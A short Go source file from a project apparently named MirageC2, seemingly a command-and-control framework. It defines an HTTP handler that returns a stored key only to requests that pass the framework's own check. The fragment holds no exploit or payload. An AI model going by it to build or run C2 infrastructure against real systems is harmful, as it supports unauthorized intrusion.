package webstart

import (
	"MirageC2_V1.0/public/check"
	"net/http"
)

func SwitchKey(w http.ResponseWriter, r *http.Request, Originalkey string) {
	if check.MirageCheck(w, r) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(Originalkey))
	}
}
